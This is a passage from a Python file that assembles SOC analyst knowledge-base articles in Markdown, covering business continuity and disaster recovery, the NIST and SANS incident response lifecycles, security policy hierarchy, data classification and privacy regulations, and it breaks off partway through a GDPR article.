| Detect | 9.1 (Monitoring) | 8, 10, 13 |
| Respond | 10 (Improvement) | 17 |
| Recover | 10 (Improvement) | 11 |

## SOC Analyst Practical Guide

### Daily Framework Awareness

- [ ] Understand which framework your organization follows
- [ ] Know which CIS Controls map to your detection rules
- [ ] Reference framework language in incident reports
- [ ] Align new detection proposals with framework gaps
- [ ] Use framework mappings in threat intelligence reporting

### Framework-Based Detection Coverage Assessment

```
For each CIS Control in scope:
  1. List sub-controls applicable to your environment
  2. Identify which sub-controls have detection rules
  3. Calculate coverage percentage
  4. Prioritize gaps based on Implementation Group
  5. Propose new detections to fill gaps
```

## Key Takeaways

- NIST CSF provides strategic structure; CIS Controls provide tactical actions
- ISO 27001 is the path to certification; NIST CSF is the path to maturity
- Use CIS Controls IG1 as minimum baseline for any organization
- Frameworks complement each other; most mature organizations use multiple
- SOC analysts should map their detections to framework controls for coverage analysis
- Framework language helps communicate with leadership and auditors
"""
    ))

    # ------------------------------------------------------------------
    # Article 3: Business Continuity and Disaster Recovery
    # ------------------------------------------------------------------
    articles.append((
        "Business Continuity and Disaster Recovery",
        ["governance", "risk", "business-continuity", "disaster-recovery", "bcp", "drp"],
        r"""# Business Continuity and Disaster Recovery

## Overview

Business Continuity Planning (BCP) and Disaster Recovery Planning (DRP) ensure an organization
can maintain or quickly restore critical functions during and after a disruptive event. SOC
analysts play a key role in detection, communication, and recovery during incidents that
trigger these plans.

## BCP vs. DRP

| Aspect | Business Continuity Plan (BCP) | Disaster Recovery Plan (DRP) |
|--------|-------------------------------|------------------------------|
| **Focus** | Keeping the business running | Restoring IT systems and data |
| **Scope** | Entire organization | IT infrastructure and data |
| **Timeframe** | During and after disruption | After disruption occurs |
| **Owner** | Business leadership | IT / Infrastructure team |
| **Trigger** | Any significant disruption | IT system failure or disaster |
| **Includes** | People, processes, facilities, IT | Servers, networks, data, applications |

**Relationship:** DRP is a subset of BCP. You cannot have business continuity without
disaster recovery, but DR alone does not ensure business continuity.

## Key Metrics

| Metric | Full Name | Definition | Example |
|--------|-----------|-----------|---------|
| **RTO** | Recovery Time Objective | Maximum acceptable downtime | Payment system: 1 hour |
| **RPO** | Recovery Point Objective | Maximum acceptable data loss (time) | Database: 15 minutes |
| **MTTR** | Mean Time to Repair | Average time to restore service | Email server: 2 hours |
| **MTBF** | Mean Time Between Failures | Average uptime between failures | Server cluster: 8,760 hours |
| **WRT** | Work Recovery Time | Time to verify restored systems | Application testing: 30 minutes |
| **MAD** | Maximum Allowable Downtime | Total time before irreversible harm | ERP system: 24 hours |

**Critical Relationship:** RTO + WRT must be less than MAD.

```
|<--- MAD (Maximum Allowable Downtime) --->|
|<--- RTO --->|<--- WRT --->|
 [Outage]      [Restore]     [Verify]      [Back to normal]
```

## Business Impact Analysis (BIA)

The BIA identifies critical business functions and the impact of their disruption.

**BIA Process:**

1. Identify all business processes
2. Determine dependencies (systems, people, vendors)
3. Assess impact of disruption over time
4. Establish RTO and RPO for each process
5. Prioritize recovery order

**BIA Output Example:**

| Business Function | RTO | RPO | Dependencies | Impact at 4 hrs | Impact at 24 hrs |
|-------------------|-----|-----|-------------|-----------------|-----------------|
| Online transactions | 1 hr | 15 min | Payment gateway, DB | $500K revenue loss | $3M + reputation |
| Email | 4 hrs | 1 hr | Exchange, DNS | Moderate disruption | Employee productivity |
| HR Payroll | 24 hrs | 24 hrs | HRIS, banking | Minimal | Moderate if near payday |
| Public website | 8 hrs | 4 hrs | CDN, CMS, DB | Brand impact | Customer churn |

## DR Site Types

| Site Type | Description | RTO | Cost | Equipment | Data |
|-----------|------------|-----|------|-----------|------|
| **Hot Site** | Fully operational duplicate | Minutes to hours | Very High | Running and current | Real-time replication |
| **Warm Site** | Partially equipped facility | Hours to days | Medium | Hardware present, needs config | Regular backups |
| **Cold Site** | Empty facility with power/network | Days to weeks | Low | None; must be procured | Offsite backups |
| **Cloud DR** | Cloud-based recovery | Minutes to hours | Variable | On-demand provisioning | Replicated to cloud |
| **Mobile Site** | Portable, containerized | Hours to days | Medium | Self-contained | Shipped or replicated |

### Selection Guidance

| Factor | Hot | Warm | Cold | Cloud |
|--------|-----|------|------|-------|
| RTO < 4 hours | Best | Possible | No | Best |
| Budget limited | No | Good | Best | Good |
| Regulatory requirements | Common | Depends | Rarely sufficient | Common |
| Test frequency needed | Easy | Moderate | Difficult | Easy |

## BC Strategy Development

### Strategy Checklist

- [ ] Complete BIA for all critical functions
- [ ] Define RTO/RPO for each critical system
- [ ] Select appropriate DR site type
- [ ] Establish backup and replication strategy
- [ ] Define communication plans (internal and external)
- [ ] Identify alternate work locations
- [ ] Document vendor dependencies and SLAs
- [ ] Assign roles and responsibilities
- [ ] Define escalation procedures
- [ ] Plan for staff unavailability

### Communication Plan Template

| Audience | Method | Timing | Message Owner | Backup Owner |
|----------|--------|--------|---------------|-------------|
| Executive team | Phone tree, SMS | Immediate | CISO | IT Director |
| All employees | Email, intranet | Within 1 hour | HR Director | Comms Manager |
| Customers | Website, email | Within 4 hours | CMO | PR Manager |
| Regulators | Formal notification | Per requirement | Legal | CISO |
| Media | Press release | After internal comms | PR Manager | CEO |
| Vendors | Email, phone | Within 2 hours | Procurement | IT Director |

## Testing Types

| Test Type | Description | Disruption | Frequency |
|-----------|------------|-----------|-----------|
| **Tabletop Exercise** | Discussion-based walkthrough of scenarios | None | Quarterly |
| **Walkthrough Test** | Step-by-step review with all stakeholders | None | Semi-annually |
| **Simulation** | Simulated disaster with response actions | Minimal | Annually |
| **Parallel Test** | Activate DR while production runs | Low | Annually |
| **Full Interruption** | Shut down production, activate DR | High | Rarely (every 2-3 years) |
| **Component Test** | Test individual systems or processes | Low | Monthly/Quarterly |

### Tabletop Exercise Template

**Scenario:** Ransomware encrypts 80% of file servers on a Friday evening.

Discussion points:
1. Who is notified first? By what method?
2. What is the initial containment action?
3. When do we activate the BC/DR plan?
4. How do we communicate with employees who cannot work?
5. What is our recovery priority order?
6. When do we notify customers?
7. When do we engage law enforcement?
8. What is our backup restoration timeline?

## Plan Maintenance

| Activity | Frequency | Responsible |
|----------|-----------|-------------|
| Review and update plans | Annually (minimum) | BC Manager |
| Update contact information | Quarterly | All team leads |
| After major changes (merger, new systems) | As needed | BC Manager + IT |
| After real incidents | Within 30 days | Incident Commander |
| Validate backup integrity | Monthly | IT Operations |
| Test DR site failover | Annually | IT + BC Manager |
| Train new employees on BC roles | Upon onboarding | HR + BC Manager |

## SOC Analyst Role in BC/DR

### During an Incident

1. **Detection:** Identify events that may trigger BC/DR activation
2. **Assessment:** Determine scope and severity for escalation decisions
3. **Communication:** Notify incident commander and BC team
4. **Containment:** Prevent further damage while DR activates
5. **Monitoring:** Watch for secondary attacks during recovery
6. **Documentation:** Log all actions and timeline for post-incident review

### Key Integration Points

- [ ] Know the escalation criteria that trigger BC/DR plan activation
- [ ] Have BC/DR contact lists accessible offline (printed or mobile)
- [ ] Understand SOC operational continuity during facility loss
- [ ] Know how to monitor DR site when activated
- [ ] Participate in tabletop exercises regularly

## Key Takeaways

- BCP covers the entire business; DRP focuses on IT recovery
- RTO and RPO drive all DR strategy and technology decisions
- Regular testing is essential; an untested plan is an unreliable plan
- SOC analysts are often the first to detect events requiring BC/DR activation
- Communication plans are as important as technical recovery plans
- Cloud-based DR has made hot-site capabilities accessible to smaller organizations
"""
    ))

    # ------------------------------------------------------------------
    # Article 4: Incident Response Lifecycle NIST and SANS
    # ------------------------------------------------------------------
    articles.append((
        "Incident Response Lifecycle NIST and SANS",
        ["governance", "risk", "incident-response", "nist", "sans", "ir-lifecycle"],
        r"""# Incident Response Lifecycle: NIST and SANS

## Overview

Incident response (IR) is the organized approach to addressing and managing security incidents.
Two primary models guide IR: NIST SP 800-61 and the SANS Incident Handler's Handbook. SOC
analysts operate within these frameworks daily, even when they are not explicitly referenced.

## NIST SP 800-61 Rev. 2 Phases

### Phase 1: Preparation

The foundation of effective incident response. This phase occurs before any incident.

**Key Preparation Activities:**

| Activity | Description | Owner |
|----------|------------|-------|
| IR plan development | Documented procedures for handling incidents | IR Manager |
| Team formation | Define roles, on-call rotations, escalation paths | SOC Manager |
| Tool deployment | SIEM, EDR, forensic tools, ticketing system | Security Engineering |
| Communication plan | Internal and external notification procedures | IR Manager + Legal |
| Training and exercises | Tabletop exercises, purple team drills | Training Lead |
| Threat intelligence | CTI feeds, ISAC membership, threat briefings | CTI Team |
| Baseline documentation | Normal network behavior, authorized software | IT Operations |

**Preparation Checklist:**

- [ ] IR plan reviewed and updated within last 12 months
- [ ] Contact list current (internal team, legal, PR, law enforcement, vendors)
- [ ] Jump bag or forensic toolkit ready and inventoried
- [ ] Playbooks exist for top 10 incident types
- [ ] War room or virtual equivalent identified
- [ ] Out-of-band communication channel established
- [ ] Evidence storage and chain of custody procedures documented

### Phase 2: Detection and Analysis

The phase where SOC analysts spend most of their time.

**Detection Sources:**

| Source | Examples | Typical Alert Volume |
|--------|---------|---------------------|
| SIEM | Correlation rules, anomaly detection | High |
| EDR | Endpoint behavioral alerts | Medium-High |
| IDS/IPS | Network signature matches | High |
| Firewall | Blocked connections, policy violations | Very High |
| Email gateway | Phishing, malware attachments | High |
| User reports | Suspicious emails, unusual behavior | Low-Medium |
| Threat intelligence | IOC matches, dark web monitoring | Low |
| Vulnerability scans | New critical vulnerabilities | Medium |

**Analysis Workflow:**

```
Alert Received
  |-> Initial triage (is this a true positive?)
  |-> Categorize (malware, phishing, unauthorized access, etc.)
  |-> Determine scope (how many systems/users affected?)
  |-> Assess severity (what is the business impact?)
  |-> Assign priority (P1-P4 based on severity + urgency)
  |-> Document initial findings
  |-> Escalate if needed
```

**Incident Severity Levels:**

| Level | Name | Description | Response Time | Example |
|-------|------|-------------|--------------|---------|
| P1 | Critical | Active threat, major business impact | Immediate (24/7) | Active ransomware, data exfiltration |
| P2 | High | Significant threat, limited spread | Within 1 hour | Compromised admin account |
| P3 | Medium | Contained threat, moderate impact | Within 4 hours | Malware on single endpoint |
| P4 | Low | Minor issue, minimal impact | Next business day | Policy violation, adware |

### Phase 3: Containment, Eradication, and Recovery

NIST combines these into one phase, but they are distinct activities.

**Containment Strategies:**

| Strategy | Speed | Evidence Preservation | Use When |
|----------|-------|----------------------|----------|
| Network isolation | Fast | Good | Lateral movement suspected |
| Account lockout | Fast | Good | Compromised credentials |
| Endpoint quarantine | Fast | Good | Malware on endpoint |
| Firewall block | Fast | Moderate | C2 communication detected |
| System shutdown | Immediate | Poor (volatile data lost) | Imminent data destruction |
| DNS sinkhole | Fast | Good | Widespread malware C2 |

**Short-term vs. Long-term Containment:**

| Short-term | Long-term |
|-----------|-----------|
| Isolate affected segment | Patch the vulnerability |
| Block malicious IP/domain | Rebuild compromised systems |
| Disable compromised account | Implement additional controls |
| Deploy temporary firewall rule | Harden configurations |

**Eradication Activities:**

- Remove malware from all affected systems
- Close attack vectors (patch vulnerabilities, fix misconfigurations)
- Reset compromised credentials
- Verify removal with scanning and monitoring
- Address root cause, not just symptoms

**Recovery Steps:**

1. Restore systems from clean backups or rebuild
2. Reconnect systems to network in controlled manner
3. Monitor recovered systems closely for re-infection
4. Validate business function is restored
5. Remove temporary containment measures
6. Confirm with system owners that operations are normal

### Phase 4: Post-Incident Activity (Lessons Learned)

**Lessons Learned Meeting Agenda:**

| Topic | Questions to Address |
|-------|---------------------|
| Timeline | What happened and when? (construct detailed timeline) |
| Detection | How was the incident detected? Could we have found it sooner? |
| Response | What worked well? What did not work well? |
| Impact | What was the actual business impact? |
| Root cause | What was the underlying vulnerability or gap? |
| Improvements | What changes will prevent recurrence? |
| Documentation | Is the incident fully documented? |
| Metrics | Update MTTD, MTTR, and other IR metrics |

## SANS 6-Step Model

| SANS Step | NIST Equivalent | Key Activities |
|-----------|----------------|---------------|
| 1. Preparation | Preparation | Policy, tools, training, team |
| 2. Identification | Detection and Analysis | Detect, validate, scope |
| 3. Containment | Containment | Short-term and long-term containment |
| 4. Eradication | Eradication | Remove threat, patch, harden |
| 5. Recovery | Recovery | Restore, monitor, validate |
| 6. Lessons Learned | Post-Incident Activity | Review, improve, document |

### NIST vs. SANS Comparison

| Aspect | NIST SP 800-61 | SANS |
|--------|---------------|------|
| Phases | 4 (containment/eradication/recovery combined) | 6 (each step separate) |
| Focus | Government and enterprise | Practitioner-oriented |
| Documentation | Extensive guidance document | Concise handbook |
| Adoption | Federal agencies, large enterprises | Training, certifications (GCIH) |
| Flexibility | High (framework-level) | Moderate (process-level) |

## IR Team Structure

| Role | Responsibility | Typical Background |
|------|---------------|-------------------|
| **Incident Commander** | Overall coordination and decisions | Senior security leader |
| **SOC Analyst (Tier 1)** | Initial triage and classification | Security operations |
| **SOC Analyst (Tier 2)** | Deep analysis and investigation | Security analysis |
| **IR Lead (Tier 3)** | Advanced investigation, forensics | Incident response, forensics |
| **Threat Intel Analyst** | IOC research, attribution | Threat intelligence |
| **Forensic Analyst** | Evidence collection and analysis | Digital forensics |
| **Communications Lead** | Internal/external messaging | PR, corporate communications |
| **Legal Counsel** | Regulatory and legal guidance | Cybersecurity law |
| **IT Operations** | System recovery and restoration | System administration |
| **Executive Sponsor** | Business decisions, resource approval | C-suite / VP |

## Playbook Integration

**Standard Playbook Structure:**

```
Playbook: [Incident Type]
  1. Detection Criteria
     - What alerts or indicators trigger this playbook?
  2. Initial Assessment
     - What questions must be answered in first 15 minutes?
  3. Containment Actions
     - Step-by-step containment with decision points
  4. Investigation Steps
     - Evidence to collect, queries to run, IOCs to check
  5. Eradication Procedures
     - How to remove the threat completely
  6. Recovery Steps
     - How to restore normal operations
  7. Communication Requirements
     - Who to notify and when
  8. Escalation Criteria
     - When to escalate to next tier or management
```

**Common Playbook Types:**

- [ ] Phishing / business email compromise
- [ ] Ransomware / destructive malware
- [ ] Unauthorized access / compromised credentials
- [ ] Data exfiltration / data breach
- [ ] Insider threat
- [ ] DDoS attack
- [ ] Web application compromise
- [ ] Supply chain compromise

## Key Takeaways

- Both NIST and SANS models cover the same ground; SANS separates containment/eradication/recovery
- Preparation is the most important phase; invest heavily here
- Detection and analysis is where SOC analysts live daily
- Document everything during an incident; memory is unreliable under stress
- Lessons learned meetings are not optional; they drive continuous improvement
- Playbooks turn frameworks into actionable, repeatable procedures
"""
    ))

    # ------------------------------------------------------------------
    # Article 5: Security Policies Standards Procedures Guidelines
    # ------------------------------------------------------------------
    articles.append((
        "Security Policies Standards Procedures Guidelines",
        ["governance", "compliance", "policies", "standards", "procedures", "security-governance"],
        r"""# Security Policies, Standards, Procedures, and Guidelines

## Overview

Security governance relies on a hierarchy of documents that define what must be done, how
it must be done, and recommendations for best practice. SOC analysts operate within this
framework daily, enforcing policies through detection rules and responding to violations
through established procedures.

## The Policy Hierarchy

```
         +------------------+
         |     POLICIES     |   <-- WHY and WHAT (mandatory)
         +------------------+
                 |
         +------------------+
         |    STANDARDS     |   <-- WHAT specifically (mandatory)
         +------------------+
                 |
         +------------------+
         |   PROCEDURES     |   <-- HOW to do it (mandatory)
         +------------------+
                 |
         +------------------+
         |   GUIDELINES     |   <-- SUGGESTIONS (optional)
         +------------------+
                 |
         +------------------+
         |    BASELINES     |   <-- MINIMUM CONFIG (mandatory)
         +------------------+
```

| Document Type | Purpose | Mandatory | Audience | Approved By | Example |
|--------------|---------|-----------|----------|-------------|---------|
| **Policy** | High-level statement of intent | Yes | All employees | Executive/Board | "All data must be classified" |
| **Standard** | Specific requirements to meet policy | Yes | Technical teams | CISO / IT Director | "Passwords must be 14+ characters" |
| **Procedure** | Step-by-step instructions | Yes | Operators | Department heads | "How to reset a compromised password" |
| **Guideline** | Recommendations and best practices | No | All relevant staff | Subject matter experts | "Consider using a password manager" |
| **Baseline** | Minimum configuration settings | Yes | System admins | Security team | "CIS Benchmark for Windows Server" |

## Essential Security Policies

### Core Policies Every Organization Needs

| Policy | Purpose | Key Content |
|--------|---------|-------------|
| Information Security Policy | Master policy governing all security | Scope, roles, risk management approach |
| Acceptable Use Policy (AUP) | Define permitted use of IT resources | Internet use, email, personal devices |
| Access Control Policy | Govern who can access what | Least privilege, need-to-know, reviews |
| Data Classification Policy | Define how to classify and handle data | Levels, labeling, handling requirements |
| Incident Response Policy | Establish IR authority and process | Reporting requirements, team authority |
| Password / Authentication Policy | Define authentication requirements | Complexity, MFA, rotation, lockout |
| Remote Work Policy | Secure remote and mobile working | VPN, endpoint requirements, physical |
| Change Management Policy | Control changes to IT systems | Approval process, testing, rollback |
| Backup and Recovery Policy | Ensure data protection and availability | Frequency, retention, testing |
| Vendor / Third-Party Policy | Manage supply chain risk | Assessment, contracts, monitoring |
| Physical Security Policy | Protect physical assets and facilities | Access controls, visitor management |
| Network Security Policy | Secure network infrastructure | Segmentation, monitoring, wireless |

### Acceptable Use Policy Template Outline

```
1. Purpose and Scope
   - Why this policy exists
   - Who it applies to (employees, contractors, vendors)

2. Ownership and Responsibility
   - IT department responsibilities
   - User responsibilities

3. Acceptable Use
   - Authorized business use of systems
   - Limited personal use parameters
   - Approved software and services

4. Prohibited Activities
   - Unauthorized access attempts
   - Installing unauthorized software
   - Sharing credentials
   - Circumventing security controls
   - Illegal activities
   - Excessive personal use

5. Email and Communication
   - Business email expectations
   - Personal email restrictions
   - Phishing reporting procedures

6. Internet Use
   - Acceptable browsing
   - Blocked categories
   - Streaming and bandwidth

7. Mobile and BYOD
   - Device registration requirements
   - Security requirements (encryption, MDM)
   - Remote wipe consent

8. Monitoring and Privacy
   - Organization's right to monitor
   - Privacy expectations (or lack thereof)
   - Data retention for monitoring

9. Enforcement
   - Consequences of violation
   - Disciplinary process
   - Reporting violations

10. Review and Acknowledgment
    - Annual review cycle
    - Employee acknowledgment requirement
```

## How to Write Effective Policy

### Policy Writing Checklist

- [ ] State the purpose clearly in the first paragraph
- [ ] Define the scope (who, what, where)
- [ ] Use plain language; avoid unnecessary jargon
- [ ] Make requirements unambiguous (use "must" and "shall", not "should" or "may")
- [ ] Include definitions for technical terms
- [ ] Specify roles and responsibilities
- [ ] Define exceptions process
- [ ] Include enforcement and consequences
- [ ] Add a version history and review date
- [ ] Get appropriate approval (legal, HR, executive)

### Policy Language Guide

| Word | Meaning | Use In |
|------|---------|--------|
| **Must / Shall** | Mandatory requirement | Policies, Standards |
| **Should** | Recommended but not required | Guidelines |
| **May** | Optional, permitted | Guidelines |
| **Must not / Shall not** | Absolutely prohibited | Policies, Standards |
| **Should not** | Not recommended | Guidelines |

### Common Policy Mistakes

| Mistake | Problem | Solution |
|---------|---------|----------|
| Too technical | Non-technical staff cannot understand | Write for the broadest audience |
| Too vague | Unenforceable requirements | Use specific, measurable language |
| Too long | Nobody reads it | Keep policies concise; details in standards |
| No exceptions process | Blocks legitimate business needs | Include formal exception/waiver process |
| Never updated | Becomes irrelevant | Mandate annual review cycle |
| No enforcement | Treated as optional | Define clear consequences |

## Policy Lifecycle

| Phase | Activities | Frequency |
|-------|-----------|-----------|
| **Draft** | Research requirements, write initial version | As needed |
| **Review** | Legal, HR, technical, stakeholder review | During drafting |
| **Approve** | Executive or board approval | After review |
| **Publish** | Distribute, train, acknowledge | After approval |
| **Enforce** | Monitor compliance, handle violations | Ongoing |
| **Review** | Assess effectiveness, update as needed | Annually (minimum) |
| **Retire** | Supersede or withdraw outdated policies | As needed |

## Standards in Practice

### Example: Encryption Standard

```
Standard: Data Encryption Standard
Version: 2.1
Effective Date: 2026-01-15
Policy Reference: Data Classification Policy, Section 4.2

Requirements:
  1. Data at Rest
     - Confidential and Restricted data MUST be encrypted using AES-256
     - Full disk encryption MUST be enabled on all laptops and mobile devices
     - Database encryption MUST use Transparent Data Encryption (TDE)

  2. Data in Transit
     - TLS 1.2 or higher MUST be used for all external communications
     - TLS 1.3 SHOULD be used where supported
     - SSL 3.0, TLS 1.0, and TLS 1.1 MUST NOT be used
     - Internal APIs handling Confidential data MUST use TLS

  3. Key Management
     - Encryption keys MUST be stored in a hardware security module (HSM) or
       approved key management service
     - Key rotation MUST occur at least annually
     - Compromised keys MUST be revoked within 4 hours of discovery
```

## SOC Analyst Relevance

### How Policies Affect SOC Operations

| Policy | SOC Impact | Detection Example |
|--------|-----------|-------------------|
| Acceptable Use | Monitor for policy violations | Web filter alerts for prohibited categories |
| Access Control | Detect unauthorized access | Failed login threshold alerts |
| Password Policy | Enforce authentication standards | Password spray detection |
| Data Classification | Protect sensitive data | DLP alerts on restricted data |
| Change Management | Detect unauthorized changes | File integrity monitoring alerts |
| Remote Work | Monitor remote access | VPN anomaly detection |

### Practical Guidance

- [ ] Keep a copy of all security policies accessible during investigations
- [ ] Reference specific policy sections in incident reports
- [ ] Understand the exception process (not all violations are incidents)
- [ ] Know which violations require HR involvement vs. technical remediation
- [ ] Suggest policy updates based on patterns observed in SOC operations
- [ ] Ensure SOC procedures align with overarching policies

## Key Takeaways

- Policies define WHAT; standards specify HOW MUCH; procedures explain HOW
- Use mandatory language (must/shall) in policies and standards
- Every policy needs an owner, review cycle, and enforcement mechanism
- SOC analysts enforce policies through detection and response
- Policy violations are not always security incidents; understand the difference
- Good policies enable security; bad policies are ignored
"""
    ))

    # ------------------------------------------------------------------
    # Article 6: Data Classification and Handling
    # ------------------------------------------------------------------
    articles.append((
        "Data Classification and Handling",
        ["governance", "compliance", "data-classification", "data-handling", "data-protection"],
        r"""# Data Classification and Handling

## Overview

Data classification assigns a sensitivity level to information based on its value, legal
requirements, and potential impact if disclosed, altered, or destroyed. SOC analysts must
understand classification because it determines the urgency and handling requirements for
incidents involving data.

## Classification Levels

| Level | Description | Impact if Compromised | Examples |
|-------|------------|----------------------|----------|
| **Public** | Freely available information | Minimal or none | Marketing materials, press releases |
| **Internal** | For internal use only | Minor embarrassment or inconvenience | Internal memos, org charts, policies |
| **Confidential** | Restricted to authorized personnel | Significant financial or legal impact | Financial reports, contracts, strategies |
| **Restricted** | Highest sensitivity | Severe damage, regulatory penalties | PII, PHI, payment card data, trade secrets |

### Government/Military Classification (for reference)

| Level | Description |
|-------|------------|
| Unclassified | No damage to national security |
| Controlled Unclassified (CUI) | Requires safeguarding |
| Confidential | Damage to national security |
| Secret | Serious damage to national security |
| Top Secret | Exceptionally grave damage to national security |

## Sensitive Data Types

| Data Type | Full Name | Regulation | Examples |
|-----------|-----------|-----------|----------|
| **PII** | Personally Identifiable Information | Various (state, federal) | Name + SSN, name + DOB, email + password |
| **PHI** | Protected Health Information | HIPAA | Medical records, insurance claims, diagnoses |
| **PCI** | Payment Card Industry Data | PCI DSS | Card numbers, CVV, cardholder name |
| **IP** | Intellectual Property | Trade secret law, NDA | Source code, formulas, designs |
| **SPII** | Sensitive PII | NIST SP 800-122 | SSN, biometrics, financial account numbers |

### PII Identification Quick Reference

| PII Element | Alone is PII? | Combined is PII? |
|-------------|--------------|------------------|
| Full name | Sometimes | Yes (with other data) |
| Social Security Number | Yes | -- |
| Date of birth | No | Yes (with name) |
| Email address | Sometimes | Yes (with other data) |
| Phone number | No | Yes (with name) |
| IP address | Context-dependent | Yes (with browsing data) |
| Biometric data | Yes | -- |
| Financial account number | Yes | -- |
| Medical record number | Yes | -- |

## Labeling Requirements

| Classification | Digital Labeling | Physical Labeling | Email Subject |
|---------------|-----------------|-------------------|---------------|
| Public | None required | None required | None required |
| Internal | Footer: "Internal Use Only" | Stamp or watermark | [INTERNAL] prefix |
| Confidential | Header/footer: "Confidential" | Cover sheet, watermark | [CONFIDENTIAL] prefix |
| Restricted | Header/footer/watermark: "Restricted" | Cover sheet, colored paper | [RESTRICTED] prefix |

## Handling Procedures by Level

### Storage

| Requirement | Public | Internal | Confidential | Restricted |
|-------------|--------|----------|-------------|------------|
| Encryption at rest | No | Recommended | Required | Required (AES-256) |
| Access control | Open | Authenticated users | Need-to-know | Named individuals only |
| Cloud storage | Any approved | Approved services | Approved + encrypted | Approved + encrypted + geo-restricted |
| Removable media | Allowed | Allowed | Encrypted only | Prohibited unless approved |

### Transmission

| Requirement | Public | Internal | Confidential | Restricted |
|-------------|--------|----------|-------------|------------|
| Internal email | Open | Standard email | Encrypted recommended | Encrypted required |
| External email | Open | Standard email | Encrypted required | Encrypted + DLP approval |
| File transfer | Any method | Approved methods | SFTP/SCP/encrypted | SFTP/SCP + approval |
| Verbal discussion | No restrictions | Normal caution | Private setting | Secure room, no recording |

### Access

| Requirement | Public | Internal | Confidential | Restricted |
|-------------|--------|----------|-------------|------------|
| Authentication | None | Single factor | Multi-factor recommended | Multi-factor required |
| Authorization | None | Role-based | Need-to-know + role | Named individual + approval |
| Access review | None | Annual | Semi-annual | Quarterly |
| Logging | Optional | Standard | Detailed | Comprehensive + alerting |

## Data Lifecycle

| Phase | Security Considerations | SOC Relevance |
|-------|----------------------|---------------|
| **Creation** | Classify at creation, apply labels | Monitor for unclassified sensitive data |
| **Storage** | Encrypt per classification, access controls | Monitor access to restricted repositories |
| **Use** | Enforce handling procedures, DLP | Detect policy violations during use |
| **Sharing** | Verify recipient authorization, encrypt | Monitor outbound data flows |
| **Archival** | Maintain encryption, reduce access | Monitor archived data access |
| **Destruction** | Verify complete removal, certificate | Verify destruction was performed |

## Data Destruction Methods

| Method | Media Type | Classification | Description |
|--------|-----------|---------------|-------------|
| **Clear** | Digital | Internal | Overwrite with zeros (single pass) |
| **Purge** | Digital | Confidential | Cryptographic erase or multi-pass overwrite |
| **Destroy** | Digital | Restricted | Physical destruction (shred, incinerate, demagnetize) |
| **Shredding** | Paper | All levels | Cross-cut for Confidential+, strip-cut for Internal |
| **Degaussing** | Magnetic media | Confidential+ | Strong magnetic field to erase data |
| **Crypto-shredding** | Encrypted media | All levels | Destroy the encryption key |

### Destruction Verification

- [ ] Destruction performed by authorized personnel or certified vendor
- [ ] Certificate of destruction obtained and retained
- [ ] Serial numbers of destroyed media recorded
- [ ] Asset inventory updated to reflect destruction
- [ ] Destruction log maintained for audit compliance

## Data Classification Process

### Step-by-Step Classification

1. **Identify** the data being created or received
2. **Determine** regulatory requirements (PII, PHI, PCI)
3. **Assess** business impact if disclosed/modified/lost
4. **Assign** classification level based on highest sensitivity element
5. **Label** according to organizational standards
6. **Apply** handling controls per classification level
7. **Review** classification periodically (data may change sensitivity)

### Classification Decision Matrix

| Question | Yes --> Higher Classification | No --> Lower Classification |
|----------|------------------------------|----------------------------|
| Contains PII/PHI/PCI? | Confidential or Restricted | Continue assessment |
| Regulatory requirement? | Per regulation requirements | Continue assessment |
| Competitive advantage? | Confidential minimum | Continue assessment |
| Financial impact if disclosed? | Based on severity | Continue assessment |
| Legal liability if disclosed? | Confidential or Restricted | Continue assessment |
| Internal operations only? | Internal minimum | May be Public |

## SOC Analyst Practical Guide

### DLP Alert Triage

When a DLP alert fires, consider:

1. What classification level is the data?
2. Is the user authorized to access this data?
3. Is the transmission method appropriate for this level?
4. Is this a legitimate business need or policy violation?
5. Is the destination internal or external?
6. Does this match a known exfiltration pattern?

### Common SOC Scenarios

| Scenario | Classification Impact | Response |
|----------|----------------------|----------|
| Employee emails spreadsheet with SSNs | Restricted data via email | Block, notify employee and manager |
| Customer database backup to USB | Restricted (PII) on removable media | Investigate, enforce encryption policy |
| Public financial report shared on LinkedIn | Public data shared publicly | No action needed |
| Internal org chart posted to Reddit | Internal data shared externally | Low severity policy violation |
| Source code pushed to public GitHub | Restricted (IP) shared publicly | Immediate containment, credential rotation |

## Key Takeaways

- Classify data at creation; the highest sensitivity element determines the level
- Different classification levels require different storage, transmission, and access controls
- PII, PHI, and PCI have specific regulatory requirements that override general classification
- Data destruction must be verifiable and appropriate to the classification level
- SOC analysts must understand classification to properly triage DLP and data-related alerts
- Over-classification is as problematic as under-classification; it causes alert fatigue
"""
    ))

    # ------------------------------------------------------------------
    # Article 7: Privacy Regulations GDPR CCPA HIPAA Overview
    # ------------------------------------------------------------------
    articles.append((
        "Privacy Regulations GDPR CCPA HIPAA Overview",
        ["governance", "compliance", "privacy", "gdpr", "ccpa", "hipaa", "regulations"],
        r"""# Privacy Regulations: GDPR, CCPA, and HIPAA Overview

## Overview

Privacy regulations define how organizations must collect, process, store, and protect
personal information. SOC analysts encounter these regulations during data breach
investigations, DLP alert handling, and incident reporting. Understanding the key
requirements helps ensure compliant incident response.

## Key Privacy Principles

Most modern privacy regulations share these foundational principles:

| Principle | Description | Practical Implication |
|-----------|------------|----------------------|
| **Lawfulness** | Data processing must have a legal basis | Document why you collect each data element |
| **Purpose Limitation** | Collect data only for stated purposes | Do not repurpose data without consent |
| **Data Minimization** | Collect only what is necessary | Limit fields collected in forms and logs |
| **Accuracy** | Keep personal data accurate and current | Implement correction mechanisms |
| **Storage Limitation** | Retain data only as long as needed | Define and enforce retention periods |
| **Integrity and Confidentiality** | Protect data with appropriate security | Encrypt, access control, monitor |
| **Accountability** | Demonstrate compliance | Maintain records, audit regularly |
| **Transparency** | Inform individuals about data processing | Privacy notices, breach notifications |

## GDPR (General Data Protection Regulation)

### Scope and Applicability

- **Effective:** May 25, 2018
- **Applies to:** Any organization processing personal data of EU/EEA residents
- **Extraterritorial:** Applies regardless of where the organization is located
- **Applies when:** Offering goods/services to EU residents OR monitoring their behavior

### Key GDPR Requirements

| Requirement | Detail | SOC Impact |
|-------------|--------|-----------|
| Lawful basis for processing | Must have one of six legal bases | Log collection must be justified |
| Data Protection Officer (DPO) | Required for large-scale processing | DPO may be consulted during incidents |
| Data Protection Impact Assessment | Required for high-risk processing | New monitoring tools may need DPIA |
| Right to access | Individuals can request their data | May receive Subject Access Requests |
| Right to erasure | "Right to be forgotten" | Must be able to delete from all systems |
| Right to portability | Provide data in machine-readable format | Export capabilities needed |
| Breach notification | 72-hour notification to supervisory authority | SOC must classify breaches quickly |
| Privacy by design | Build privacy into systems from the start | Security tools must respect privacy |

### GDPR Breach Notification Timeline

```
Hour 0:  Breach detected
         |-> Immediately assess scope and data types
